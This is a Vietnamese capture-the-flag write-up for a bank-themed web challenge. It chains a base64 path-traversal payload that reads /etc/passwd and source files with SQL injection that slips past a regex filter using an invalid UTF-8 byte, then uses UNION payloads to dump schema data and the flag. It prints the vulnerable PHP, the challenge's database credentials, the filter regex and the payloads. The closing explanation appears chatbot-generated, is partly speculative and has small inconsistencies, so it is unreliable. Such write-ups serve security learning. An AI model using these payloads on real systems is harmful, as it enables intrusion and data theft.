---
layout: post
title:  "SQLi MBBank"
date:   2025-08-11 10:38:00 +0700
tags: Writeup MBBankCTF
categories: jekyll update
---

# SQLi MBBank 

## Giao diện Web 

![image](https://hackmd.io/_uploads/SJdppf6vxg.png)

Khi vào thì mình thấy tham số `f`, tham số này hoàn toàn nhận 1 giá trị đã được encode base64. 

Sau khi decode thì nó hoàn toàn là 1 file hình ảnh. 

![image](https://hackmd.io/_uploads/BJ1fB76vge.png)

Và khi truy cập vào các mục như About thì được trả về 1 hình ảnh. 

![image](https://hackmd.io/_uploads/S1JumqTPeg.png)

## Khai thác 

Như vậy mình có thể thấy nếu nó lấy file hình ảnh thì có thể bị dính path traversal. 

Mình truyền payload như sau: `../../../../etc/passwd` => `Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==` 

![image](https://hackmd.io/_uploads/B1QYSQTwle.png)

Từ đây, mình bắt đầu đọc các file để tìm ra bug sqli. 

Sau khi truyền payload `../index.php` thì có được source như sau. 

```PHP=
<?php
error_reporting(0);
include('conn.php');
function get_description($conn, $cardname)
{
    $stmt = $conn->prepare("SELECT description FROM cards WHERE name = '$cardname'");
    if ($stmt === false) {
        die("Prepare failed");
    }
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result === false) {
        die("Query failed");
    }

    if ($result->num_rows > 0) {
        $output = "";
        while ($row = $result->fetch_assoc()) {
            $output .= $row['description'] . "<br>";
        }
        return $output;
    } else {
        return "Null";
    }
}

if (!isset($_GET['f'])) {
    header("Location: ?f=cHJpb3JpdHktY3JlZGl0LWNhcmQuanBn");
    exit();
}

if (isset($_GET['f'])) {
    $cardname = $_GET['f'];
    $cardname = base64_decode($cardname);

    $imagePath = "images/".$cardname;

    $position = strrpos($cardname, '.');

    $cardname = substr($cardname, 0, $position);
    
    $description = get_description($conn, $cardname);
    
    if (!file_exists($imagePath)) {
        $html = "<h1>$description</h1>
                <img src='./images/betterttv.gif' alt='kho lam' class='user-image'>";
    } else {
        if ($cardname == "vong-tay"){
            $description = "Sản phẩm chưa được phát hành <br>".$description;
        }
        $imageBase64 = base64_encode(file_get_contents($imagePath));
        $html = "<h1>$description</h1>
                <div class='user-image'>
                    <img src='data:image/jpeg;base64,$imageBase64' alt='Image' class='user-image'>
                </div>";
    }
}
echo "<!DOCTYPE html>
<html lang='en'>

<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <meta name='description' content='Page about Dịch vụ thẻ MB '>
    <title>Dịch vụ thẻ MB</title>
    <link rel='icon' href='./images/LOGO.jpg' type='image/x-icon'>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #333;
            color: white;
            padding: 10px 20px;
            text-align: center;
        }
        .nav-list {
            list-style-type: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center;
        }
        .nav-list li {
            margin: 0 15px;
        }
        .nav-list a {
            color: white;
            text-decoration: none;
        }
        .container {
            padding: 20px;
        }
        .content {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .user-image img {
            width: 472px; /* Adjust the width */
            height: 300px; /* Adjust the height */
            object-fit: cover; /* Maintain aspect ratio */
            border-radius: 5px; /* Optional: Add rounded corners */
        }
        .footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 10px 0;
            position: fixed;
            width: 100%;
            bottom: 0;
        }
        .button-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin-top: 20px;
        }
        .button-container button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #333;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
        .button-container button:hover {
            background-color: #555;
        }
    </style>
</head>

<body>
    <header class='header'>
        <h1>Dịch vụ thẻ MB</h1>
        <nav>
            <ul class='nav-list'>
                <li><a href='images/betterttv.gif'>Home</a></li>
                <li><a href='images/betterttv.gif'>About</a></li>
                <li><a href='images/betterttv.gif'>Contact</a></li>
            </ul>
        </nav>
    </header>
    <main class='container'>
        <section class='content'>
            $html
            <!-- Buttons to navigate to user images -->
            <div class='button-container'>
                <button onclick=\"window.location.href='?f=cHJpb3JpdHktY3JlZGl0LWNhcmQuanBn'\">MB Priority</button>
                <button onclick=\"window.location.href='?f=bWItaGktbG9sLWNvbGxlY3Rpb24tMi0wMS5qcGc'\">MB Hi LoL</button>
                <button onclick=\"window.location.href='?f=c2t5LmpwZw'\">Be The Sky</button>
                <button onclick=\"window.location.href='?f=aGktbWFzdGVyY2FyZC1jb2xsZWN0aW9uLmpwZw'\">MB Hi Mastercard Collection</button>
                <button onclick=\"window.location.href='?f=bWItdmlzYS1pbmZpbml0ZS5qcGc'\">MB Visa Infinite</button>
                <button onclick=\"window.location.href='?f=dm9uZy10YXkuanBn'\">MB Stellar</button>
                <button onclick=\"window.location.href='?f=cmVhZHktcHJpbnQtY29udmVydC1lZGl0LTAxLXNtZS5qcGc'\">MB Visa Commerce</button>
                <button onclick=\"window.location.href='?f=dGhlLWFjdGl2ZS1wbHVzLWxvZ28tbWJiYW5rLW5nYW4tYW5nLXF1YW4tZG9pLmpwZw'\">Active Plus</button>
                <button onclick=\"window.location.href='?f=bWItY3JlZGl0Y2FyZC1nb2xkLmpwZw'\">MB Visa</button>
                <button onclick=\"window.location.href='?f=cHJpb3JpdHlwYXNzLTE5NDItcmV0b3VjaDAxKGhrLXIxKS1tLmpwZw'\">Priority Pass</button>
                <button onclick=\"window.location.href='?f=bWItZGViaXRjYXJkLXBlcnNvbmFsLmpwZw'\">MB Visa 2</button>
            </div>
        </section>
    </main>
    <footer class='footer'>
        <p>&copy; 2024 Dịch vụ thẻ MB </p>
    </footer>
</body>

</html>";
?>
``` 

Và file `conn.php` như sau: 

```PHP=
<?php
$servername = "my_database";
$username = "mb_credit_card";
$password = "mb_credit_card";
$dbname = "mb_credit_card";

$conn = new mysqli($servername, $username, $password, $dbname);
``` 

Sau khi đọc source thì phát hiện câu query lấy `description` nối chuỗi. Nến mình truyền payload có dấu `'`, nhưng mình bị filter như sau: 

![image](https://hackmd.io/_uploads/H1SiImaDle.png)

Bộ regex như sau: 

```mysql
r"('|--|\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bDROP\b)"
```

Như trên thì regex đã chặn `'`, `OR`, `AND`, `UNION`, `SELECT`, `INSERT`, `UPDATE`, `DELETE` và `DROP`. 

Thì mình đã thử các payload như `or`, `oR` hay `Or` nhưng đều bị chặn. 

![image](https://hackmd.io/_uploads/S1fuWcavee.png)

Nên có thể firewall xử lý có hàm uppercase trước, rồi mới đưa vào trong pattern kia. 

Do nó dùng `\bOR\b` nên nó sẽ match hoàn toàn nếu dùng từ độc lập, liệu thử payload `'\**\or\**\` thì nó liền 1 khối sẽ như thế nào? 

![image](https://hackmd.io/_uploads/HkMYG5aPxx.png)

Nó hoàn toàn bị filter. 

Các payload và technique được ứng dụng và biến thể từ các tài liệu:
- https://security.stackexchange.com/questions/220748/replaced-single-quote-bypass-for-sqli - Để thử xem có thể bypass dấu ' mà không cần dùng dấu ', nhưng kể cả có escape khi dùng backslash thì vẫn phải tìm cách đóng nó lại
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet - cheat sheet sqli 
- https://as745591.medium.com/albussec-penetration-list-06-sql-injection-sqli-sample-2-9818a6bb2875 - Sử dụng comment hoặc các operator theo cách khác để tránh validation
- https://portswigger.net/support/sql-injection-bypassing-common-filters
- https://www.dionach.com/fun-with-sql-injection-using-unicode-smuggling/ - Encode unicode payload
- https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections - exploit một hard validation trong php (do tôi xem wappalyzer thấy ngôn ngữ của web app là PHP) nhưng vẫn không ứng dụng được

Nhưng đa số áp dụng thì đều trả về Null hoặc kèm theo 1 hình ảnh của the rock. 

Quan sát và đọc kỹ lại source thì có lỗi Sqli nằm trong câu query `SELECT description FROM card WHERE name = '$cardname'`. 

Thì nó có logic như sau: 

![image](https://hackmd.io/_uploads/rJtSE5TPlx.png)

Khi mình nhập 1 tên file như sau: `abc.jpg` thì nó sẽ tách làm hai phần `abc` và `jpg` và chỉ nhận `abc` để đưa vào hàm `get_description`. Thì lúc đó nó query dựa vào tên đã được lưu trong DB. 

Sau khi có tìm hiểu về cách escape dấu `'` thì có tìm hiểu được các bài viết comment lại như sau: 
- https://dev.mysql.com/doc/refman/8.4/en/comments.html 

Thì có loại comment để mysql thực thi code `/!**/` thì mình đã thử payload như sau: 

![image](https://hackmd.io/_uploads/ryY9H9Twle.png)

Thì nó hoàn toàn thực thi khi trả về đúng tên description nhưng nó ko thực thi SLEEP. 

Nếu trong code không có validation cho sqli, thì rõ ràng phải tìm cách bypass firewall, theo thông báo thì nhìn giống firewall là python, với input base64, cả firewall và server cần decode để lấy data, firewall để check còn server để thực hiện sql query.

Vậy có thể có trường hợp data đặc biệt được base64, hàm base64 decode của python sẽ decode ra một kiểu khác, hàm base64 decode của php lại ra ký tự `'` mà python decode ra khác trước đó là ta có thể bypass firewall.

https://stackoverflow.com/questions/305140/base64ing-unicode-characters

Sau khi research tài liệu thì: 
- https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
- https://security.stackexchange.com/questions/54734/sql-injection-via-unicode

Thử được cái payload như sau `wCc=`

![image](https://hackmd.io/_uploads/SJWcRcavxe.png)

Như vậy trong payload hoàn toàn có `'` nhưng không bị firewall block. Thì đúng như suy luận trên thì firewall python có thể đã decode ra khác và server cũng decode ra khác. 

ChuỗiwCc= (byte `b'\xc0\x27'`) bypass firewall Python vì khi decode và chuyển sang UTF-8 với errors='replace', nó thành �, không chứa dấu ', nên không bị regex `r"('|--|\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bDROP\b)"` chặn. Trên server PHP, `b'\xc0\x27'` được giải mã và, với kết nối cơ sở dữ liệu latin1 là loại mã hóa 1 byte phổ biến trong MySQL, byte 0x27 thành dấu `'`, và khi đã bị lỗi decode, tất cả các dấu và từ phía sau đều lỗi, nên ta có thể sử dụng các câu lệnh có trong regex mà không bị chặn nữa.

Từ đây mình truyền payload như sau: `huhuhuC0' UNION SELECT SLEEP(20) #.jpg`

![image](https://hackmd.io/_uploads/BJXemsTwee.png)

Nó đã hoàn toàn sleep 10 giây. 

![image](https://hackmd.io/_uploads/B1t-Xi6wex.png)

Từ đây thì mình có thể truyền các payload sau để đọc toàn bộ DB: `huhuhuC0' UNION SELECT schema_name FROM information_schema.schemata #.jpg`

![image](https://hackmd.io/_uploads/S1T1VspPxx.png)

Để lấy tên table hiện tại: `huhuhuC0' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() #.jpg`

![image](https://hackmd.io/_uploads/SyNtEspDgl.png)

Để tiếp tục lấy tên cột trong table hiện tại: `huhuhuC0' UNION SELECT column_name FROM information_schema.columns WHERE table_name='cards' #.jpg`

![image](https://hackmd.io/_uploads/SyXeYopvll.png)

Như vậy hoàn toàn có thể trích xuất data từ các cột. 
Nhưng mà vẫn chưa biết được flag. 

Cho nên mình thử kiểm tra xem trong DB có các hàm nào đặc biệt hay ko? 

Thì mình sẽ check `routines` trong mysql. Với payload như sau: `abcC0' UNION SELECT routine_name FROM information_schema.routines#.jpg`

![image](https://hackmd.io/_uploads/rJxmr36wlg.png)

Nhìn thấy nó có trả về hai dòng là `ENC_DESCRIPTION_giu2iBkf8HFMYv6lCD69GsEvS9YOHRYq` và `DECRYPT_DESCRIPTION_iSzdBeuikNFwekdvvY2Y3LrpcxruHgP4`. 

Mình ko thể đoán nó là gì? Cho nên check tiếp `TYPE` của nó như sau: `abcC0' UNION SELECT GROUP_CONCAT(routine_name, routine_type) FROM information_schema.routines WHERE ROUTINE_NAME='DECRYPT_DESCRIPTION_iSzdBeuikNFwekdvvY2Y3LrpcxruHgP4' #.jpg` 

![image](https://hackmd.io/_uploads/BJOLL2avle.png)

Nó hoàn toàn trả về vậy thì nó là 1 hàm nên mình gọi nó thử với payload: `abcC0' UNION SELECT DECRYPT_DESCRIPTION_iSzdBeuikNFwekdvvY2Y3LrpcxruHgP4(description) FROM cards #.jpg`

![image](https://hackmd.io/_uploads/rk4yP2TDlg.png)

Nó hoàn toàn trả về Flag. 

![image](https://hackmd.io/_uploads/ryZbD26vex.png)

### Giải thích về `wCc=` và cơ chế bypass tường lửa

#### `wCc=` là gì?
- `wCc=` là chuỗi base64, khi giải mã sẽ cho ra chuỗi byte `b'\xc0\x27'`.
- Trong đó:
  - `\xc0` là byte `0xC0` (192 trong hệ thập phân), thường là byte bắt đầu của một ký tự 2-byte trong UTF-8, nhưng cần byte tiếp theo hợp lệ (trong khoảng `0x80` đến `0xBF`).
  - `\x27` là byte `0x27` (39 trong hệ thập phân), tương ứng với ký tự ASCII `'` (dấu nháy đơn).
- Chuỗi byte `b'\xc0\x27'` không phải là một chuỗi UTF-8 hợp lệ, vì `\x27` không phải là byte tiếp theo hợp lệ sau `\xc0` theo chuẩn UTF-8.

#### Tại sao `wCc=` có thể bypass tường lửa?
Tường lửa trong bài CTF được viết bằng Python và sử dụng regex `r"('|--|\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bDROP\b)"` để kiểm tra chuỗi đã giải mã từ base64. Để bypass tường lửa, chuỗi sau khi giải mã phải không chứa dấu nháy đơn (`'`) hoặc các từ khóa nguy hiểm khác trong regex. Dưới đây là cơ chế bypass:

1. **Quá trình xử lý ở tường lửa (Python)**:
   - Tường lửa giải mã base64 `wCc=` bằng hàm như `base64.b64decode('wCc=')`, kết quả là chuỗi byte `b'\xc0\x27'`.
   - Để kiểm tra regex, chuỗi byte này cần được chuyển thành chuỗi Unicode (thường là UTF-8) bằng cách như `b'\xc0\x27'.decode('utf-8')`.
   - Tuy nhiên, `b'\xc0\x27'` không phải là chuỗi UTF-8 hợp lệ, vì `\xc0` yêu cầu byte tiếp theo nằm trong khoảng `0x80` đến `0xBF`, nhưng `\x27` không thỏa mãn.
   - Nếu tường lửa xử lý lỗi UTF-8 bằng cách sử dụng `errors='replace'` (thay thế byte không hợp lệ bằng ký tự thay thế, thường là `�` - U+FFFD), thì `b'\xc0\x27'.decode('utf-8', errors='replace')` sẽ cho ra chuỗi như `�` hoặc một chuỗi không chứa dấu nháy đơn (`'`).
   - Khi regex kiểm tra chuỗi này, nó không phát hiện dấu nháy đơn (`'`) hay bất kỳ từ khóa nào khác trong danh sách (`--`, `OR`, `AND`, v.v.), do đó đầu vào được cho qua.

2. **Quá trình xử lý ở máy chủ (PHP)**:
   - Máy chủ PHP cũng giải mã `wCc=` bằng `base64_decode('wCc=')`, cho ra chuỗi byte `b'\xc0\x27'`.
   - Khi chuỗi byte này được đưa vào truy vấn SQL, nó được xử lý theo mã hóa của kết nối cơ sở dữ liệu (thường là `latin1`, `utf8`, hoặc `gbk` trong các bài CTF).
   - Nếu kết nối cơ sở dữ liệu sử dụng `latin1` (mã hóa 1-byte phổ biến trong MySQL), byte `0x27` được diễn giải trực tiếp thành dấu nháy đơn (`'`), và byte `0xC0` có thể được diễn giải thành ký tự `À` (hoặc bị bỏ qua, tùy vào cấu hình).
   - Kết quả là trong truy vấn SQL, chuỗi có thể trở thành `'À'` hoặc chỉ `'` (nếu `\xc0` bị bỏ qua), cho phép ngắt chuỗi và thực hiện SQL injection, ví dụ:
     - Giả sử truy vấn SQL là: `SELECT * FROM users WHERE username = '[input]'`.
     - Với input `wCc=`, sau giải mã có thể trở thành `À'` hoặc `'`, dẫn đến truy vấn như `SELECT * FROM users WHERE username = 'À''` hoặc `SELECT * FROM users WHERE username = '''`, làm ngắt chuỗi và cho phép chèn thêm payload như `' OR 1=1 --`.

3. **Sự khác biệt then chốt**:
   - **Python (tường lửa)**: Chuyển đổi `b'\xc0\x27'` thành chuỗi Unicode với `errors='replace'`, dẫn đến chuỗi như `�`, không chứa `'`, nên bypass regex.
   - **PHP (máy chủ)**: Sử dụng chuỗi byte `b'\xc0\x27'` trực tiếp trong truy vấn SQL, và với mã hóa `latin1`, byte `0x27` trở thành `'`, cho phép SQL injection.
   - Sự khác biệt này xuất phát từ cách Python xử lý lỗi UTF-8 (thay thế ký tự) và cách PHP/MySQL diễn giải chuỗi byte trong truy vấn SQL.

#### Ví dụ minh họa
Giả sử bạn muốn thực hiện SQL injection với payload `' OR 1=1 --`. Tuy nhiên, dấu nháy đơn (`'`) bị chặn bởi tường lửa. Thay vì gửi trực tiếp `'`, bạn thử dùng `wCc=`:
- **Đầu vào base64**: `wCc=` (hoặc kết hợp với phần còn lại của payload, nhưng giả sử chỉ thử với `wCc=` để kiểm tra dấu nháy đơn).
- **Tường lửa Python**:
  - Giải mã: `base64.b64decode('wCc=')` → `b'\xc0\x27'`.
  - Chuyển thành chuỗi: `b'\xc0\x27'.decode('utf-8', errors='replace')` → `�`.
  - Kiểm tra regex: `�` không chứa `'`, nên được cho qua.
- **Máy chủ PHP**:
  - Giải mã: `base64_decode('wCc=')` → `b'\xc0\x27'`.
  - Trong truy vấn SQL với `latin1`: `b'\xc0\x27'` được diễn giải thành `À'` hoặc `'`, làm ngắt chuỗi, ví dụ: `SELECT * FROM users WHERE username = 'À''` (có thể gây lỗi cú pháp hoặc cho phép chèn thêm payload).

Để thực hiện injection hoàn chỉnh, bạn cần mã hóa toàn bộ payload (ví dụ: `' OR 1=1 --`) sao cho sau khi giải mã, phần `' OR 1=1 --` không xuất hiện trong chuỗi mà tường lửa kiểm tra, nhưng xuất hiện trong truy vấn SQL. Tuy nhiên, vì regex cũng chặn `OR`, `AND`, v.v., bạn có thể cần mã hóa thêm hoặc thử các biến thể khác của payload.

#### Lưu ý và hạn chế
- **Phụ thuộc cấu hình**: Kỹ thuật này chỉ hoạt động nếu tường lửa sử dụng `errors='replace'` khi giải mã UTF-8 và nếu cơ sở dữ liệu PHP sử dụng mã hóa như `latin1`. Nếu tường lửa từ chối chuỗi không hợp lệ hoặc cơ sở dữ liệu sử dụng UTF-8 nghiêm ngặt, kỹ thuật này có thể thất bại.
- **Thử nghiệm cần thiết**: Bạn cần thử các chuỗi base64 khác (như mã hóa `b'\x80\x27'`, `b'\xbf\x27'`, v.v.) để tìm chuỗi phù hợp với cấu hình cụ thể của bài CTF.
- **Payload phức tạp**: Để thực hiện injection đầy đủ, bạn cần mã hóa toàn bộ payload (bao gồm `' OR 1=1 --`) sao cho bypass cả các từ khóa như `OR`, `AND`. Điều này có thể yêu cầu kết hợp các kỹ thuật khác, như sử dụng bình luận SQL (`/* */`) hoặc mã hex.

#### Tài liệu tham khảo
Mặc dù `wCc=` là ví dụ được suy ra, các tài liệu sau cung cấp nền tảng lý thuyết:
- [Exploiting hard filtered SQL Injections](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/): Thảo luận về việc sử dụng chuỗi mã hóa đặc biệt để vượt qua bộ lọc.
- [OWASP SQL Injection Bypassing WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF): Đề cập đến các kỹ thuật mã hóa để che giấu payload.
- [SQL Injection via Unicode](https://security.stackexchange.com/questions/54734/sql-injection-via-unicode): Thảo luận về việc sử dụng chuỗi không chuẩn, dù không trực tiếp liên quan đến base64.

#### Kết luận
Chuỗi `wCc=` (byte `b'\xc0\x27'`) có thể bypass tường lửa vì khi giải mã và chuyển thành chuỗi Unicode trong Python, nó trở thành ký tự thay thế (`�`), không chứa dấu nháy đơn, do đó không bị regex phát hiện. Trong khi đó, trên máy chủ PHP với mã hóa `latin1`, byte `0x27` có thể được diễn giải thành dấu nháy đơn (`'`), cho phép ngắt chuỗi trong truy vấn SQL. Bạn nên thử nghiệm với `wCc=` và các chuỗi base64 khác, đồng thời kiểm tra phản hồi của máy chủ để xác định mã hóa và điều chỉnh payload cho phù hợp. Nếu cần hỗ trợ xây dựng payload cụ thể hoặc thử nghiệm thêm, hãy cung cấp thêm thông tin về bài CTF!

